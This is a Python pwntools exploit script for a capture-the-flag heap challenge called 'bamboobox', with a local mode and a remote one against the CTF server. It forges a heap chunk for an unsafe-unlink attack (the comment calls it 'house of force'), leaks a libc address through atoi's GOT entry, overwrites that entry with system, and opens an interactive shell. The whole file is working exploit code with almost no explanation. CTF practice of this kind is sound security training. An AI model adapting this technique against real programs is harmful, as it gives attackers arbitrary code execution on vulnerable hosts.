import pwn
import pwnlib

PIPE_CLEAN_TIME = 0.5 # s

MAGIC_ADDRESS = 0x400d49

pwn.context.terminal = ['tmux', 'splitw', '-h']
# pwn.context.log_level = 'debug'

index_so_far = 0
address_atoi_got = 0x602068
address_itemlist = 0x6020c0

def add_item(p, size, payload):
    global index_so_far
    print 'add_item', str(size), repr(payload)

    print p.sendlineafter('Your choice:','2')
    print p.sendlineafter('Please enter the length of item name:', str(size))
    print p.sendafter('Please enter the name of item:', payload)
    rtn = index_so_far
    index_so_far += 1
    return rtn

def change_item(p, index, size, payload):
    print 'change_item', str(index), str(size), repr(payload)

    print p.sendlineafter('Your choice:', '3')
    print p.sendlineafter('Please enter the index of item:', str(index))
    print p.sendlineafter('Please enter the length of item name:', str(size))
    print p.sendafter('Please enter the new name of the item:', payload)
    return None

def remove_item(p, index):
    global index_so_far
    print 'remove_item', str(index)

    print p.sendlineafter('Your choice:', '4')
    print p.sendlineafter('Please enter the index of item:', str(index))
    index_so_far -= 1
    return None

def show_item(p):
    print 'show_item'
    p.clean(PIPE_CLEAN_TIME)
    p.sendline('1')
    return None

def fake_chunk(index_r, size_prev, size_r, size_next):
    and_r = address_itemlist+index_r*0x10+0x8

    payload = ''
    payload += pwn.p64( size_prev+0x10 ) # fake prev_size
    payload += pwn.p64( size_r-0x10 ) # fake size
    payload += pwn.p64( and_r-0x18 ) # fake fd, &r-0x18
    payload += pwn.p64( and_r-0x10 ) # fake bk, &r-0x10
    payload += 'z' * ( size_r-0x10-0x20 ) # padding
    payload += pwn.p64( size_r-0x10 ) # fake prev_size2
    payload += pwn.p64( size_next ) # fake next_size

    return payload

# The house of force
if __name__ == '__main__':
    if pwnlib.args.args['REMOTE']:
        p = pwn.connect('csie.ctf.tw', 10138)
    else:
        p = pwn.process('./bamboobox-649a39b0d66eb71eec94b300a629e9f645bd75ad')

    libc_elf = pwn.ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

    p.settimeout(PIPE_CLEAN_TIME)

    size_p = 0x100
    size_r = 0x100
    size_q = 0x100

    p_index = add_item(p, size_p-0x10, 'x'*(size_p-0x10-1)) # 0
    r_index = add_item(p, size_r-0x10, 'y'*(size_r-0x10-1)) # 1
    q_index = add_item(p, size_q-0x10, 'z'*(size_q-0x10-1)) # 2

    payload = fake_chunk(r_index, size_p, size_r, size_q)
    change_item(p, r_index, len(payload)+1, payload)
    remove_item(p, q_index)
    # &r = 0x6020c0 = &r - 0x18
    payload = '\x00'*0x18 + pwn.p64(address_atoi_got) + '\x00' * 0x8 * 90
    change_item(p, r_index, len(payload)+1, payload)
    show_item(p)
    print p.recvuntil(': ')
    leak_atoi_got = pwn.u64(p.recvline(keepends=False).ljust(0x8, '\x00'))
    print hex(leak_atoi_got)

    libc_base = leak_atoi_got - libc_elf.symbols['atoi']
    system_got = libc_base + libc_elf.symbols['system']
    print hex(libc_base), hex(system_got)

    # change atoi_got
    payload = pwn.p64(system_got)
    change_item(p, r_index, len(payload)+1, payload)

    # goodbye
    p.send('/bin/sh\x00')
    print p.clean(PIPE_CLEAN_TIME)
    p.interactive()
